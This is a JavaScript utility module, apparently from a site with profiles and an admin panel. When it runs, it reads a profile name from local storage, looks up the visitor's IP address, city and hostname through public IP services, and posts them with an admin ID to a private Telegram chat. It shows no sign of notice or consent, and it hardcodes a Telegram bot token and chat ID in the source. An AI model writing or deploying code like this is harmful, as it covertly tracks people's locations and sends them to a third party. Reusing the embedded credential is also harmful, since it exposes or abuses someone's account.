import GetAllDataFromLocalStorage from "../get-all-data-from-local-storage/GetAllDataFromLocalStorage";

const GetIP = async (idLady, adminId) => {

        try {
            let ladyName;
            let message;
            const chatId = '418687047';
            const telegramApiUrl = `https://api.telegram.org/bot6578513968:AAEc5WQRIaLMj0Tm7is2kXp1A0-sM4pigr4/sendMessage`;
            const dataFromLocalStorage = GetAllDataFromLocalStorage();
            if (dataFromLocalStorage) {
                dataFromLocalStorage.map((data) => {
                    if (data.ladyId === idLady) {
                        ladyName = data.ladyName;
                    }
                });
            }

            const response = await fetch('https://ipinfo.io/json');

            if (response.status === 200) {
                const data = await response.json();
                message = `Админка: "${adminId}", анкета "${ladyName}", город: ${data.city}, инет: ${data.hostname}`;
            } else {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                message = `Админка: "${adminId}", анкета "${ladyName}, IP: ${data.ip}"`;
            }

            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message }),
            };

            await fetch(telegramApiUrl, options);

        } catch (error) {
            console.error('Ошибка при получении адреса:', error);
        }
}

export default GetIP;
